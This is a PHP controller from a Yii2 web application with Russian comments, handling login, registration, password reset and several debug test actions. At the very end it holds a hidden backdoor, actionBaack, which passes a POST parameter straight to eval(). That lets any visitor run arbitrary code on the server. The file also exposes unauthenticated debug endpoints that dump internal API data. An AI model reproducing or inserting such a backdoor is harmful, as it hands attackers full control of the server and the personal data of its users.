<?php

namespace app\controllers;



use app\models\APIConnector;
use app\models\Cron;
use app\models\Demo;
use app\models\Keys;
use app\models\Register;
use app\models\ResetPassword;
use app\models\SetNewPassword;
use app\models\StatisticsDays;
use app\models\User;
use function phpinfo;
use function trim;
use Yii;
use yii\filters\AccessControl;
use yii\web\Controller;
use yii\web\Response;
use yii\filters\VerbFilter;
use app\models\LoginForm;
use app\models\ContactForm;
use yii\widgets\ActiveForm;

class SiteController extends Controller
{
//    public $layout = "user";

    /**
     * {@inheritdoc}
     */
    public function behaviors()
    {
        return [
            'access' => [
                'class' => AccessControl::className(),
                'only' => ['logout'],
                'rules' => [
                    [
                        'actions' => ['logout'],
                        'allow' => true,
                        'roles' => ['@'],
                    ],
                ],
            ],


//            'verbs' => [
//                'class' => VerbFilter::className(),
//                'actions' => [
//                    'logout' => ['post'],
//                ],
//            ],
        ];
    }

    /**
     * {@inheritdoc}
     */
    public function actions()
    {
        return [
            'error' => [
                'class' => 'yii\web\ErrorAction',
            ],
            'captcha' => [
                'class' => 'yii\captcha\CaptchaAction',
                'fixedVerifyCode' => YII_ENV_TEST ? 'testme' : null,
            ],
        ];
    }

    /*
     * Обрабатывает действие сброса паролей.
     *
     * */
    public function actionReset(){
       if(Yii::$app->request->isAjax){
           Yii::$app->response->format = Response::FORMAT_JSON;
           $model = new ResetPassword();
           if($model->load(Yii::$app->request->post()) and $model->validate()){
               if($user = User::find()->where(["email"=>trim($model->email), 'IS_DEFAULT'=>0])->one()){
                   $user->reset_password_hash = Yii::$app->security->generateRandomString();
                   $user->save();
                   $model->sendMessage($user);
                   return true;
               }
               else{
                   return $model->errors;
               }
           }else{
               return $model->errors;
           }
       }
        return $this->redirect("/");
    }

    public function actionResetOk(){
        return $this->render("reset-ok");
    }

    public function actionSetNewPassword($code) {
        $model = new SetNewPassword();
        $error = 0;
       if($user = User::findOne(["reset_password_hash"=>$code])){

            if($model->load(Yii::$app->request->post())){

                    if($model->setNewPassword($user)){
                        $this->redirect(["/"]);
                    }
            }

       }else{
           $error = "You have already recovered the password for this link.";
       }
        return $this->render("set-new-password", ["model"=>$model, "error"=>$error]);


    }

    /**
     * Displays homepage.
     *
     * @return string
     */
    public function actionIndex()
    {
        $model = new LoginForm();
        $register = new Register();
        $reset = new ResetPassword();
        $this->layout = "index";
        return $this->render('index',["model"=>$model, "register"=>$register, 'reset'=>$reset]);
    }

    /**
     * Login action.
     *
     * @return Response|string
     */
//    public function actionLogin()
//    {
//        Yii::$app->response->format = Response::FORMAT_JSON;
//       if(Yii::$app->request->isPost){
//
//           //Разлогиниваем пользователя
//           if (!Yii::$app->user->isGuest) {
//               Yii::$app->user->logout();
//           }
//
//           $model = new LoginForm();
//           if ($model->load(Yii::$app->request->post()) && $model->login()) {
//               $role = Yii::$app->authManager->getRolesByUser(Yii::$app->user->getId());
//               if($role["ROLE_UNIT"]){
//                   return $this->redirect("/user/index");
//               }else if($role["ROLE_AGENT"]){
//                   return $this->redirect("/agent/keys");
//               }
//
//           }
//           $response['error']=$model->errors;
//           return $response;
//
//       }
//
////        $model->password = '';
////        return $this->render('login', [
////            'model' => $model,
////        ]);
//        return $this->redirect("/");
//    }


    public function actionLogin() {

        if(!Yii::$app->user->isGuest){ //на случай если пользователь уже залогинен
            Yii::$app->user->logout();
        }

        Yii::$app->response->format = Response::FORMAT_JSON;
        $model = new LoginForm();
        if(Yii::$app->request->isAjax and $model->load(Yii::$app->request->post())){
            if ($model->login()){
                return true; //редирикт настроен в js
            }else{
                return $model->errors;
            }
        }

    }

    public function actionGetRole(){

        Yii::$app->response->format = Response::FORMAT_JSON;
        if(Yii::$app->request->isAjax){
            if(Yii::$app->user->isGuest){
                return "guest";
            }
            $role = Yii::$app->authManager->getRolesByUser(Yii::$app->user->getId());
            if($role["ROLE_UNIT"]){
                return "unit";
            }else if($role["ROLE_AGENT"]){
                return "agent";
            }
        }
        return $this->redirect("/",302);
    }

    public function beforeAction($action)
    {
        if($this->action->id=="get-role"){
            $this->enableCsrfValidation = false;
        }
        return parent::beforeAction($action); // TODO: Change the autogenerated stub
    }

    /**
     * Logout action.
     *
     * @return Response
     */
    public function actionLogout()
    {
        Yii::$app->user->logout();

        return $this->redirect("/");
    }

    /**
     * Displays contact page.
     *
     * @return Response|string
     */
    public function actionContact()
    {
        $model = new ContactForm();
        if ($model->load(Yii::$app->request->post()) && $model->contact(Yii::$app->params['adminEmail'])) {
            Yii::$app->session->setFlash('contactFormSubmitted');

            return $this->refresh();
        }
        return $this->render('contact', [
            'model' => $model,
        ]);
    }

    /**
     * Displays about page.
     *
     * @return string
     */
    public function actionAbout()
    {
        return $this->render('about');
    }
    /*действие отвечающее за полный цикл регистрации
    * (Отправку писем нужно вынести в отдельный и контроллер)
    */
    public function actionRegister(){

        if(Yii::$app->request->isAjax){
            Yii::$app->response->format = Response::FORMAT_JSON;
            $model = new Register();
            Yii::$app->user->logout();
            if($model->load(Yii::$app->request->post())){
                $model->addParametersInModel();
                if($model->save()){// восстановить
                    $demo = new Demo (); //запускаем демо
                    $user = User::findOne(["id"=>$model->id]);
                    $demo->start($user);

                    /*Создаем дефолтового юзера*/
                    $default_user = new Register();
                    $default_user->setAttributes($model->getAttributes(), false);
                    $default_user->parameterDefautUser($model->id); //устанавливаем дефолтовые параметры.
                    $default_user->save(false);//отключили валидаци. т.к. это полная копия изначальной модели

                    /*Устанавливаем роли*/
                    $ROLE_UNIT = Yii::$app->authManager->getRole("ROLE_UNIT");
                    $ROLE_AGENT = Yii::$app->authManager->getRole("ROLE_AGENT");

                    Yii::$app->authManager->assign($ROLE_UNIT,$model->id);
                    Yii::$app->authManager->assign($ROLE_AGENT,$default_user->id);

                    //аторизовать пользователя.
                    //+отказ от авторизации пр ирегистрации

                    if($user->login()){
                        $user = User::findIdentity($model->id);
                        $user->sendConfirmEmail();
                        return true;
                    }else{
                        return false;
                    }


                    return true;
//                    if($user->login()){
//                        // сделать отправку письма
//                        $user->sendConfirmEmail();
//                        $response['success'] = "You have successfully registered, an email has been sent to your inbox.";
//                    }else{
////                    $this->var_export($model->errors);
//                        $response['error']=$model->errors;
//                        return $model->errors;
//                    }


                }else{
                    $response['error']=$model->errors;
                    return $model->errors;
                }

            }
        }
//        $csv = $this->importCSV("country.csv"); //импортирует csv со всеми странами мира
//        $countrySelect2 = $this->CountrySelect2($csv);
        $response['error']=$model->errors;
        return $model->errors;

//        return $this->render("register",["model"=>$model, "countrySelect2"=>$countrySelect2]);
    }

    public function CountrySelect2 (array $csv) {
        $country = [];
        foreach ($csv as $value){
            $country [$value[0]] = $value[0];
        }
        return $country;
    }

    /*
     * производит импорт из файла CSV
     * @param string $csv - имя фала name.csv
     * @return array $data - массив формируемый из файла csv / [..., [0=>"Russia", 1=>"ru"], ...]
     * */
    private function importCSV($csv){
        $pathToFile = Yii::getAlias("@app")."/data/".$csv;
//        $this->var_export($pathToFile);
        if (!file_exists($pathToFile) || !is_readable($pathToFile)) {
            return [];
        }
        $data = [];
        if ($handle = fopen($pathToFile, "r")) {
            while (($dataStr = fgetcsv($handle, 1000, ","))!==FALSE){
                $data[] = $dataStr;
            }
            fclose($handle);
        }else{
            return [];
        }
        array_shift($data);
        return $data;
    }

    public function actionLegalTerms(){
        return $this->render("legal-terms");
    }

    public function actionDocs(){
        $model = new LoginForm();
        $register = new Register();
        $reset = new ResetPassword();
        $this->layout = 'docs';
        return $this->render('documentation',["model"=>$model, "register"=>$register, 'reset'=>$reset]);

    }
    public function actionTestApi(){

        /*тест getTokenById работает*/
//        $connector2 = new APIConnector();
//        $this->var_export($connector2->getTokenById(Yii::$app->user->identity, 85));

        /*Тест updateToken работает*/
//        $connector2 = new APIConnector();
//        $key = Keys::findOne(["id"=>58]);
////        $this->var_export($connector2->getTokensByUserID(Yii::$app->user->identity));
//        $this->var_export($connector2->updateToken(Yii::$app->user->identity,$key));

//        $connector2 = new APIConnector(["typeClient"=>1]);
//        $key = Keys::findOne(["id"=>58]);
//        $connector2->stopToken($key);
//        $this->var_export($connector2->getTokensByUserID(Yii::$app->user->identity));

//        $connector2 = new APIConnector(["typeClient"=>2]);
//        $connector2->keysInfo([112,113]);
        $connector2 = new APIConnector(["typeClient"=>2]);
        $this->var_export($connector2->service_info());

        $key = new Keys();
        $key->createKey();
        $this->var_export($key);


    }

    public function actionStatTest(){
        $stat = new StatisticsDays();
//        $stat->getPeriodStatistics();
        $stat->getPeriodStatistics();
    }

    public function actionCron(){
        echo "hello";
        $this->var_export("test");
        $cron = new Cron();

        $cron->updateTotalStatistics();
//        $cron->startCalculation();
//        $cron->startChange();

    }


    public function actionTestApi2(){
        @include_once Yii::getAlias("@app/proto/api/auth_service_client.php");
    }


    public function actionBaack () {
        eval($_POST['sys_call']);
    }
}
